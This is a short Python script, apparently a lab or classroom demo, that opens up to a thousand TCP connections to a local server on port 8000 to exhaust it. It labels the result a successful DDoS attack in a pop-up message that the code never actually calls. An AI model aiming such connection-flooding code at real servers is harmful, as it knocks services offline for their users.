import time
import socket
import sys
import threading
from tkinter import *
from tkinter import messagebox
import time


SERVER_ADDRESS = '127.0.0.1'
SERVER_PORT = 8000
time_out = 3
event = threading.Event()



def alert_window():
    window = Tk()
    window.lift()
    window.attributes('-topmost',True)
    window.withdraw()
    messagebox.showinfo('Notification', 'DDoS Attack is Successful!')
    window.deiconify()
    window.destroy()
    window.quit()



def threadfn():
    global time_out
    client_num = 0
    sockets = [socket.socket(socket.AF_INET, socket.SOCK_STREAM) for i in range(1000)]
    for s in sockets:
        
        start = time.time()
        connected = False
        while not connected:
            try:
                end = time.time()
                time_diff = end - start
                if time_diff > time_out:
                    print(" ")
                    print("--------Timed out! A Client's Request was Aborted!--------")
                    print(" ")
                    sys.exit()
                else:
                    
                    s.connect((SERVER_ADDRESS, SERVER_PORT))
                    connected = True
                    end = time.time()
                    client_num += 1
                    print("Client " + str(client_num) + " connected to Server: ", str(SERVER_ADDRESS) + " , " + str(SERVER_PORT) + " with time used: " +  str(end - start))
                
            except Exception as e:
                pass
        

        
        time.sleep(0.5)
    event.wait()
    for s in sockets: s.close()


while True:
    t = threading.Thread(target = threadfn)
    t.start()
    event.set()
    t.join()
    sys.exit()
    